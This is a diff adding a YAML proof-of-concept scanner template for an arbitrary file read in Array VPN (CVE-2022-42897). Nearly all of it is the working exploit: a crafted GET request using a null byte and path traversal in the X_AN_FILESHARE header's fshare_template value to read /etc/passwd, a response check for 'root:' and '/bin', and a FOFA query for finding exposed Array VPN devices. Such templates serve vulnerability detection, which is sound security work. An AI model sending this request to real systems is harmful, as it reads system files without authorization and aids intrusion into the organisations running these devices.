@@ -1,0 +1,19 @@
+id: poc-yaml-array-vpn-fshare-template-anyfile-read
+info:
+  name: Array VPN fshare_template 任意文件读取漏洞(CVE-2022-42897)
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  - CVE-2022-42897
+  finger: array
+  fofa: app="Array-VPN"
+requests:
+- method: GET
+  path: /prx/000/http/localhost/client_sec/%00../../../addfolder
+  headers:
+    X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
+  expression: status_code == 401 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"No message available")
+variables: {}
+transport: http
